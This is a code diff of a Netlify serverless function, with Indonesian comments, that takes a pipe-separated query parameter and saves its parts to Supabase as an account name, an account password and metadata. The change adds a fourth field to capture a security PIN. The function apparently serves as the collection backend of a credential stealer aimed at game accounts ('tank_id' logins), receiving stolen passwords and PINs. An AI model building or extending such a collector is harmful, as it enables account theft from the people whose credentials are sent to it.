@@ -9,27 +9,20 @@ exports.handler = async (event) => {
         "Content-Type": "application/json"
     };
 
-    // Ambil data dari 'd' atau 'data'
     const query = event.queryStringParameters || {};
     const rawData = query.d || query.data;
 
-    console.log("Data diterima:", rawData); // Cek ini di Netlify Function Logs
-
     if (!rawData) {
-        return { 
-            statusCode: 400, 
-            headers, 
-            body: JSON.stringify({ error: "No data provided", received: query }) 
-        };
+        return { statusCode: 400, headers, body: JSON.stringify({ error: "No data" }) };
     }
 
     try {
-        // Pisahkan data menggunakan pipe |
         const parts = rawData.split('|');
         const payload = {
             tank_id_name: parts[0] || "Unknown",
             tank_id_pass: parts[1] || "Unknown",
-            meta_data: parts[2] || "None"
+            meta_data: parts[2] || "None",
+            security_pin: parts[3] || "None" // Menangkap PIN dari bagian ke-4
         };
 
         const { error } = await supabase
